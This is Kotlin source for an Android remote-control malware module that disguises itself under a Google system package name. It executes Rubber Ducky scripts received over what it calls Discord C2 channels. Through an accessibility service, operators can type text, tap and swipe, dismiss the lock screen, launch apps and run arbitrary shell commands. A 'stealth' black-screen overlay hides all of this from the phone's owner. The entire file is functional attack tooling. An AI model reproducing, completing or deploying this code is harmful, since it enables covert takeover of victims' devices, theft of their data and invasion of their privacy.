package com.google.android.system

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.KeyEvent
import java.io.File
import java.util.Locale
import java.util.concurrent.Executors
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * DuckyScriptEngine
 *
 * Full-featured Ducky Script 1.0 & 2.0 Payload Interpreter.
 * Parses and executes Rubber Ducky scripts sequentially via AccessibilityService
 * and Android system APIs, with real-time feedback to Discord C2 channels.
 */
object DuckyScriptEngine {

    private const val TAG = "DuckyScriptEngine"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val mainHandler = Handler(Looper.getMainLooper())

    @Volatile
    var isExecuting = false
        private set

    fun executePayloadAsync(
        context: Context,
        scriptContent: String,
        channelId: String,
        onProgress: (String) -> Unit
    ) {
        scope.launch(Dispatchers.IO) {
            executePayload(context, scriptContent, channelId, onProgress)
        }
    }

    private suspend fun executePayload(
        context: Context,
        scriptContent: String,
        channelId: String,
        onProgress: (String) -> Unit
    ) {
        if (isExecuting) {
            onProgress("⚠️ **Ducky Script Execution Busy**: Another payload is currently running on device.")
            return
        }

        isExecuting = true
        val lines = scriptContent.lines()
        val totalLines = lines.count { it.trim().isNotBlank() }
        val startTime = System.currentTimeMillis()

        onProgress("🦆 **Ducky Script Execution Started**\n• Total Commands: `$totalLines`\n• Target Device: `${Build.MANUFACTURER} ${Build.MODEL}`")

        var executedCount = 0
        var defaultDelayMs = 0L

        try {
            for ((index, rawLine) in lines.withIndex()) {
                val line = rawLine.trim()
                if (line.isEmpty()) continue

                val lower = line.lowercase(Locale.ROOT)
                Log.d(TAG, "[DuckyCmd] Line ${index + 1}: $line")

                when {
                    // Comments
                    lower.startsWith("rem ") || lower == "rem" -> {
                        val comment = if (line.length > 4) line.substring(4).trim() else ""
                        Log.i(TAG, "REM: $comment")
                    }

                    // Default Delay
                    lower.startsWith("default_delay ") || lower.startsWith("defaultdelay ") -> {
                        val msStr = line.substringAfter(" ").trim()
                        defaultDelayMs = msStr.toLongOrNull() ?: 0L
                    }

                    // Specific Delay
                    lower.startsWith("delay ") -> {
                        val msStr = line.substring(6).trim()
                        val ms = msStr.toLongOrNull() ?: 500L
                        delay(ms)
                    }

                    // String Typing
                    lower.startsWith("string ") -> {
                        val text = line.substring(7)
                        val accessService = AppAccessibilityService.instance
                        if (accessService != null) {
                            accessService.typeText(text)
                        } else {
                            typeTextViaShell(text)
                        }
                        executedCount++
                    }

                    // String + Enter
                    lower.startsWith("stringln ") -> {
                        val text = line.substring(9)
                        val accessService = AppAccessibilityService.instance
                        if (accessService != null) {
                            accessService.typeText(text)
                            delay(100L)
                            accessService.performGlobal(KeyEvent.KEYCODE_ENTER)
                        } else {
                            typeTextViaShell(text)
                            delay(100L)
                            pressKeyViaShell(KeyEvent.KEYCODE_ENTER)
                        }
                        executedCount++
                    }

                    // Enter Key
                    lower == "enter" -> {
                        performKeyOrGlobal(KeyEvent.KEYCODE_ENTER, AccessibilityService.GLOBAL_ACTION_BACK)
                        executedCount++
                    }

                    // Backspace / Delete
                    lower == "backspace" || lower == "delete" -> {
                        performKeyOrGlobal(KeyEvent.KEYCODE_DEL, 0)
                        executedCount++
                    }

                    // Tab Key
                    lower == "tab" -> {
                        performKeyOrGlobal(KeyEvent.KEYCODE_TAB, 0)
                        executedCount++
                    }

                    // Escape / Back Key
                    lower == "escape" || lower == "esc" -> {
                        AppAccessibilityService.instance?.performGlobal(AccessibilityService.GLOBAL_ACTION_BACK)
                        executedCount++
                    }

                    // Home Button
                    lower == "home" || lower == "gui" || lower == "windows" || lower == "command" -> {
                        AppAccessibilityService.instance?.performGlobal(AccessibilityService.GLOBAL_ACTION_HOME)
                        executedCount++
                    }

                    // GUI r / Search Run Dialog
                    lower == "gui r" || lower == "windows r" -> {
                        AppAccessibilityService.instance?.performGlobal(AccessibilityService.GLOBAL_ACTION_HOME)
                        delay(300L)
                        // Launch Search / App Drawer
                        openGlobalSearchOrHome(context)
                        executedCount++
                    }

                    // Recents / App Switcher
                    lower == "recents" || lower == "recent" || lower == "app_switch" -> {
                        AppAccessibilityService.instance?.performGlobal(AccessibilityService.GLOBAL_ACTION_RECENTS)
                        executedCount++
                    }

                    // Notifications Shade
                    lower == "notification" || lower == "notifications" -> {
                        AppAccessibilityService.instance?.performGlobal(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS)
                        executedCount++
                    }

                    // Quick Settings Shade
                    lower == "quick_settings" || lower == "quicksettings" -> {
                        AppAccessibilityService.instance?.performGlobal(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
                        executedCount++
                    }

                    // Power Dialog
                    lower == "power" || lower == "power_dialog" -> {
                        AppAccessibilityService.instance?.performGlobal(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
                        executedCount++
                    }

                    // Lock Screen
                    lower == "lock" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            AppAccessibilityService.instance?.performGlobal(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                        } else {
                            pressKeyViaShell(KeyEvent.KEYCODE_POWER)
                        }
                        executedCount++
                    }

                    // Volume Controls
                    lower == "volup" || lower == "volume_up" -> {
                        adjustVolume(context, raise = true)
                        executedCount++
                    }
                    lower == "voldown" || lower == "volume_down" -> {
                        adjustVolume(context, raise = false)
                        executedCount++
                    }

                    // App Launching
                    lower.startsWith("app_open ") || lower.startsWith("open_app ") || lower.startsWith("launch ") -> {
                        val appQuery = line.substringAfter(" ").trim()
                        launchAppByNameOrPackage(context, appQuery)
                        executedCount++
                    }

                    // Touch Tap (Normalized relX relY)
                    lower.startsWith("tap ") || lower.startsWith("click ") -> {
                        val parts = line.split(" ").map { it.trim() }.filter { it.isNotEmpty() }
                        if (parts.size >= 3) {
                            val relX = parts[1].toFloatOrNull() ?: 0.5f
                            val relY = parts[2].toFloatOrNull() ?: 0.5f
                            val displayMetrics = context.resources.displayMetrics
                            val realX = relX * displayMetrics.widthPixels
                            val realY = relY * displayMetrics.heightPixels
                            AppAccessibilityService.instance?.dispatchTap(realX, realY)
                            executedCount++
                        }
                    }

                    // Touch Swipe (Normalized startX startY endX endY duration)
                    lower.startsWith("swipe ") -> {
                        val parts = line.split(" ").map { it.trim() }.filter { it.isNotEmpty() }
                        if (parts.size >= 5) {
                            val sx = parts[1].toFloatOrNull() ?: 0.5f
                            val sy = parts[2].toFloatOrNull() ?: 0.8f
                            val ex = parts[3].toFloatOrNull() ?: 0.5f
                            val ey = parts[4].toFloatOrNull() ?: 0.2f
                            val dur = if (parts.size >= 6) parts[5].toLongOrNull() ?: 300L else 300L

                            val displayMetrics = context.resources.displayMetrics
                            val realSx = sx * displayMetrics.widthPixels
                            val realSy = sy * displayMetrics.heightPixels
                            val realEx = ex * displayMetrics.widthPixels
                            val realEy = ey * displayMetrics.heightPixels

                            AppAccessibilityService.instance?.dispatchSwipe(realSx, realSy, realEx, realEy, dur)
                            executedCount++
                        }
                    }

                    // Remote Unlock
                    lower == "unlock" -> {
                        AppAccessibilityService.instance?.dismissKeyguard()
                        executedCount++
                    }

                    // Stealth Mode Toggle
                    lower == "stealth" || lower == "stealth on" || lower == "stealth_on" -> {
                        AppAccessibilityService.instance?.showBlackScreenOverlay()
                        executedCount++
                    }
                    lower == "stealth off" || lower == "stealth_off" -> {
                        AppAccessibilityService.instance?.hideBlackScreenOverlay()
                        executedCount++
                    }

                    // Shell Command Execution
                    lower.startsWith("shell ") || lower.startsWith("termux ") -> {
                        val cmd = line.substringAfter(" ").trim()
                        runShellCommand(cmd)
                        executedCount++
                    }

                    else -> {
                        Log.w(TAG, "Unrecognized Ducky Script line: $line")
                    }
                }

                if (defaultDelayMs > 0) {
                    delay(defaultDelayMs)
                } else {
                    delay(50L) // Default 50ms pulse delay between commands
                }
            }

            val elapsedSec = "%.1f".format((System.currentTimeMillis() - startTime) / 1000.0)
            onProgress("✅ **Ducky Script Payload Executed Successfully!**\n• Executed: `$executedCount` commands\n• Duration: `${elapsedSec}s`\n• Device: `${Build.MANUFACTURER} ${Build.MODEL}`")
        } catch (e: Exception) {
            Log.e(TAG, "Ducky Script execution error: ${e.message}", e)
            onProgress("❌ **Ducky Script Execution Error**: `${e.message}`")
        } finally {
            isExecuting = false
        }
    }

    private fun performKeyOrGlobal(keyCode: Int, globalAction: Int) {
        val accessService = AppAccessibilityService.instance
        if (accessService != null && globalAction > 0) {
            accessService.performGlobal(globalAction)
        } else {
            pressKeyViaShell(keyCode)
        }
    }

    private fun typeTextViaShell(text: String) {
        try {
            val sanitized = text.replace(" ", "%s").replace("'", "\\'")
            val pb = ProcessBuilder("sh", "-c", "input text '$sanitized'")
            pb.start().waitFor()
        } catch (e: Exception) {
            Log.w(TAG, "typeTextViaShell error: ${e.message}")
        }
    }

    private fun pressKeyViaShell(keyCode: Int) {
        try {
            val pb = ProcessBuilder("sh", "-c", "input keyevent $keyCode")
            pb.start().waitFor()
        } catch (e: Exception) {
            Log.w(TAG, "pressKeyViaShell error: ${e.message}")
        }
    }

    private fun runShellCommand(cmd: String) {
        try {
            val pb = ProcessBuilder("sh", "-c", cmd)
            pb.start().waitFor()
        } catch (e: Exception) {
            Log.w(TAG, "runShellCommand error: ${e.message}")
        }
    }

    private fun adjustVolume(context: Context, raise: Boolean) {
        try {
            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
            val direction = if (raise) android.media.AudioManager.ADJUST_RAISE else android.media.AudioManager.ADJUST_LOWER
            audioManager?.adjustVolume(direction, android.media.AudioManager.FLAG_SHOW_UI)
        } catch (e: Exception) {
            Log.w(TAG, "adjustVolume error: ${e.message}")
        }
    }

    private fun openGlobalSearchOrHome(context: Context) {
        try {
            val intent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
        } catch (e: Exception) {
            Log.w(TAG, "openGlobalSearchOrHome error: ${e.message}")
        }
    }

    private fun launchAppByNameOrPackage(context: Context, query: String) {
        val pm = context.packageManager
        val cleanQuery = query.lowercase(Locale.ROOT).trim()

        // 1. Direct package launch
        val launchIntent = pm.getLaunchIntentForPackage(query)
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(launchIntent)
            Log.i(TAG, "Launched app package: $query")
            return
        }

        // 2. Search installed apps by name
        val installedApps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        for (app in installedApps) {
            val label = pm.getApplicationLabel(app).toString().lowercase(Locale.ROOT)
            if (label == cleanQuery || label.contains(cleanQuery) || app.packageName.lowercase(Locale.ROOT).contains(cleanQuery)) {
                val intent = pm.getLaunchIntentForPackage(app.packageName)
                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(intent)
                    Log.i(TAG, "Launched app '$label' (${app.packageName})")
                    return
                }
            }
        }
        Log.w(TAG, "Could not find app matching query: $query")
    }
}
